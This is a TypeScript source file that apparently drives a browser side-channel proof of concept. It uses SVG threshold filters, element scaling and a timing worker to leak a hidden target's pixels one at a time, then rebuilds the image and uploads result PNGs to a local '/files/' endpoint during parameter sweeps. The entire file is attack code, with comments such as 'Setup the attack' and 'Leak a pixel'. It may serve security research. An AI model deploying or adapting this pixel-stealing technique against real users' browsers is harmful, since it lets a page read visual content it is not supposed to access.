import { extract, find, runLengthEncode } from './find';
import { Signal } from './signal';

function log(content: string) {
    (window as any).dump(content);
}

class Generator {
    private y = 0;
    private readonly context: CanvasRenderingContext2D

    public constructor(
        private readonly canvas: HTMLCanvasElement,
        private readonly width: number,
        private readonly height: number,
    ) {
        this.canvas.height = height;
        this.canvas.width = width;
        this.context = canvas.getContext('2d')!
    }

    private color(height: number, color: string) {
        this.context.lineWidth = 0;
        this.context.fillStyle = color;
        this.context.fillRect(0, this.y, this.width, this.y + height);
        this.y += height;
    }

    public white(height: number) {
        this.color(height, 'rgb(255,255,255)');
    }

    public gray(height: number) {
        this.color(height, 'rgb(129,129,129)');
    }

    public black(height: number) {
        this.color(height, 'rgb(0,0,0)');
    }

    public save() {
        return this.canvas.toDataURL('png');
    }
}

function generatePreamble(canvas: HTMLCanvasElement) {
    const g = new Generator(canvas, 256, 128);
    const signal = '1010111010100010'

    for (const c of signal) {
        switch (c) {
            case '0': g.black(8); break;
            case '1': g.gray(8); break;
        }
    }

    return g.save();
}

function generateMask(canvas: HTMLCanvasElement) {
    const g = new Generator(canvas, 256, 128);

    for (let i = 0; i < 4; i++) {
        g.white(16);
        g.black(16);
    }

    return g.save();
}

function generateTarget(canvas: HTMLCanvasElement) {
    const g = new Generator(canvas, 25, 25);

    for (let i = 0; i < 25; i += 2) {
        g.white(1);
        g.black(1);
    }

    return g.save();
}


window.addEventListener('load', async () => {
    const step = 1;
    const scale = 8;
    const parallel = 8;
    const MODE = 'scan';
    let x = 0;
    let y = 0;
    const w = 25;
    const h = 25;
    const SINGLE = false;

    const C = [30];
    const T = [250];
    const S = [30000];

    // Setup the attack
    const canvas = document.getElementById('result')! as HTMLCanvasElement;
    const mask = generateMask(canvas);

    const svg = `
        <svg width="0%" height="0%">
            <defs>
                <filter id="myfilter" color-interpolation-filters="sRGB">
                    <feComponentTransfer>
                        <feFuncR type="discrete" tableValues="0 1"></feFuncR>
                        <feFuncG type="discrete" tableValues="0 1"></feFuncG>
                        <feFuncB type="discrete" tableValues="0 1"></feFuncB>
                    </feComponentTransfer>
                    <feGaussianBlur stdDeviation="0" />
                </filter>
                <filter id="myfilter2" color-interpolation-filters="sRGB">
                    <feComponentTransfer>
                        <feFuncR type="discrete" tableValues="0 0.507"></feFuncR>
                        <feFuncG type="discrete" tableValues="0 0.507"></feFuncG>
                        <feFuncB type="discrete" tableValues="0 0.507"></feFuncB>
                    </feComponentTransfer>
                </filter>
            </defs>
        </svg>
    `;
    const div = document.createElement('div');
    div.innerHTML = svg;
    document.body.appendChild(div);

    // Setup the preamble
    const preamble = document.getElementById('preamble')!;
    preamble.style.backgroundImage = `url("${generatePreamble(canvas)}")`
    preamble.style.width = "256px";
    preamble.style.height = "128px";

    // Enable the filter
    const filterElements = document.getElementsByClassName('filter') as HTMLCollectionOf<HTMLDivElement>;
    for (const filterElement of filterElements) {
        filterElement.classList.add('refresh-filter');
    }

    await new Promise((resolve) => setTimeout(resolve, 1000));
    const status = document.getElementById('status')! as HTMLDivElement;
    const worker = new Worker('js/attack.js')
    const unknownElements = document.getElementsByClassName('target_unknown') as HTMLCollectionOf<HTMLDivElement>;

    const ctx = canvas.getContext('2d')!;
    ctx.imageSmoothingEnabled = false;
    ctx.fillRect(x, y, step, step);

    const src = document.createElement("img");
    src.src = "image.png";
    ctx.drawImage(src, 250, 0, w * scale, h * scale);

    const colors = new Array(w * h).fill(0);
    let color = 2;

    const output = [];
    const attempts = new Array<number>();

    let startTime = Date.now();

    function sample() {
        for (const unknownElement of unknownElements) {
            console.log(y);
            unknownElement.style.transform = `scale(256,${128 / parallel}) translate(-${x}px, -${y}px)`;
        }

        // Leak a pixel
        worker.postMessage({
            type: 'sample',
            x: x,
            y: y,
            color: color
        });
    }

    function average(ns: number[]) {
        let sum = 0;

        for (let n of ns) {
            sum += n;
        }

        return sum / ns.length;
    }

    let first = true;

    let ci = 0;
    let ti = 0;
    let si = 0;

    let cutoff = C[0];
    let threshold = T[0];
    let samples = S[0];


    canvas.width = 512;
    canvas.height = 256;
    ctx.imageSmoothingEnabled = false;
    ctx.drawImage(src, 250, 0, w * scale, h * scale);

    worker.onmessage = async function (message) {
        switch (message.data.type) {
            case "ready": {
                log("Ready...\n");

                worker.postMessage({
                    type: 'update',
                    mode: MODE,
                    cutoff: cutoff,
                    threshold: threshold,
                    samples: samples,
                });

                sample();
                break;
            }

            case "log": {
                break;
            }

            case "result": {
                if (first) {
                    const signal = Signal.deserialize(message.data.signal);

                    const matches = find(Signal.fromString('101011101010001'), signal);

                    const signals = new Array<Signal<unknown>>();

                    function normalize(signal: Signal<unknown>, num: number) {
                        const max = signal.data.reduce((p, c) => Math.max(p, c));
                        const min = signal.data.reduce((p, c) => Math.min(p, c));

                        return Signal.subValue(num, Signal.divValue(max - min, Signal.subValue(min, signal)));
                    }

                    const start = matches.length === 0 ? undefined : matches[0].samples.start - 100;
                    const end = matches.length === 0 ? undefined : matches[0].samples.end + 400;

                    function sum(input: Float64Array) {
                        let total = 0;
                        for (let value of input) {
                            total += value;
                        }
                        return total;
                    }

                    function average(input: Float64Array) {
                        return sum(input) / input.length;
                    }

                    signals.push(signal);
                }

                const endTime = Date.now();
                const data = message.data.data;

                const ctx = canvas.getContext('2d')!;
                for (let pixel = 0; pixel < parallel; pixel++) {
                    const p = average(data.slice(pixel * (16 / parallel) + 1, pixel * (16 / parallel) + 2)) >= 0.5;
                    const yp = y + pixel;

                    if (yp >= h) {
                        break;
                    }

                    colors[x + w * yp] |= ((p ? 1 : 0) << color);

                    const c = colors[x + w * yp];
                    ctx.fillStyle = `rgb(${(c & 0x04) ? 255 : 0},${(c & 0x02) ? 255 : 0},${(c & 0x01) ? 255 : 0})`;
                    ctx.fillRect(x * scale, yp * scale, step * scale, step * scale);

                    ctx.drawImage(src, 250, 0, w * scale, h * scale);
                    ctx.strokeStyle = `rgb(255,255,255)`;
                    ctx.strokeRect(250 + x * scale, yp * scale, step * scale, step * scale);
                }

                if (attempts.length >= 5) {
                    attempts.shift();
                }
                attempts.push(message.data.attempts);

                const time = Math.round((endTime - startTime) / 1000);
                const sec = (time % 60).toString().padStart(2, '0');
                const min = (Math.floor((time / 60)) % 60).toString().padStart(2, '0');
                const hr = (Math.floor((time / 60 / 60)) % 24).toString().padStart(2, '0');

                status.innerText = `Attempts: ${Math.round(average(attempts) * 100) / 100} | Time: ${hr}:${min}:${sec} | ${color}`

                x += step;
                if (x >= w) {
                    y += step * parallel;
                    x = 0;
                }
                if (y >= h) {
                    color--;

                    if (color >= 0) {
                        x = 0;
                        y = 0;
                    }
                }

                if (color < 0 || time > 10 * 60) {
                    startTime = Date.now();
                    canvas.toBlob(async blob => {
                        await fetch(`/files/${cutoff}-${threshold}-${samples}_${hr}-${min}-${sec}.png`, {
                            headers: {
                                'Content-Type': 'image/png',
                            },
                            method: 'PUT',
                            body: new Uint8Array(await blob?.arrayBuffer()!),
                        });

                        ctx.clearRect(0, 0, 300, 300);

                        ci++;
                        if (ci >= C.length) {
                            ci = 0;
                            ti++;
                            if (ti >= T.length) {
                                ti = 0;
                                si++;
                                if (si >= S.length) {
                                    worker.terminate();
                                    return;
                                }
                            }
                        }
                        cutoff = C[ci];
                        threshold = T[ti];
                        samples = S[si];
                        colors.fill(0);

                        worker.postMessage({
                            type: 'update',
                            mode: MODE,
                            cutoff: cutoff,
                            threshold: threshold,
                            samples: samples,
                        });
                        x = 0;
                        y = 0;
                        color = 2;

                        sample();
                    }, 'image/png');
                } else {
                    if (SINGLE) {
                        worker.terminate();
                    } else {
                        sample();
                    }
                }
            }

        }
    }
});
